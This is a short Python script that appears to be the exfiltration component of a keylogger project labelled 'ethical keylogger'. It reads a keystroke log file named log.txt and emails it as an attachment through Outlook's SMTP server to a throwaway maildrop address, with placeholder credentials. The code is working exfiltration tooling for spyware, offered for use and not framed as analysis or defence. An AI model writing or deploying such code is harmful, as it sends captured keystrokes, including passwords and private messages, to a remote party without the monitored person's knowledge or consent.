import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# Email credentials
email_user = 'abc@outlook.com'   #sample mail
email_send = 'sample@maildrop'   #add temporary mail from maildrop
email_password = 'some random password'  # Replace with your valid app password
subject = 'ethical keylogger'

# Prepare the email
msg = MIMEMultipart()
msg['From'] = email_user
msg['To'] = email_send
msg['Subject'] = subject

body = 'Here is the keylogger log file attached.'
msg.attach(MIMEText(body, 'plain'))

# Attach the file
filename = 'log.txt'
with open(filename, 'rb') as attachment:
    part = MIMEBase('application', 'octet-stream')
    part.set_payload(attachment.read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', f"attachment; filename={filename}")
msg.attach(part)

# Use STARTTLS for port 587
try:
    server = smtplib.SMTP('smtp-mail.outlook.com', 587)  # Correct server and port for STARTTLS
    server.set_debuglevel(1)  # Enable debugging
    server.starttls()  # Upgrade connection to secure TLS
    server.login(email_user, email_password)  # Log in to your account
    server.sendmail(email_user, email_send, msg.as_string())  # Send the email
    print("Email sent successfully!")
except smtplib.SMTPAuthenticationError as e:
    print(f"Authentication Error: {e}")
except Exception as e:
    print(f"An error occurred: {e}")
finally:
    server.quit()  # Close the connection

